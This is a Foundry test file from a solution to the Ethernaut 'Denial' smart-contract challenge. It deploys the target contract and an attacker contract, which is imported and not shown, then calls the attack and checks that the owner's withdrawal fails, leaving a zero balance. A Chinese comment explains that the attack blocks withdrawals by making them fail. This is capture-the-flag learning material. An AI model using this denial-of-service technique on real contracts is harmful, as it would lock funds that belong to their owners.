pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Denial, DenialAttacker} from "../src/Denial.sol";


/** 
 * 解题思路：思路类似 King，通过让 withdraw 失败来阻止提现成功
 */
contract HackDenialTest is Test {
    address hacker = address(hacker);
    Denial public d;
    DenialAttacker public da;

    function setUp() public {
        vm.deal(hacker, 1 ether);
        d = new Denial();
        address d1 = address(d);
        address payable d2 = payable(d1);
        da = new DenialAttacker(d2);
    }
    function testHackDenial() public {
        da.attack();
        // owner 无法提款成功
        assert(d.owner().balance == 0);
    }
}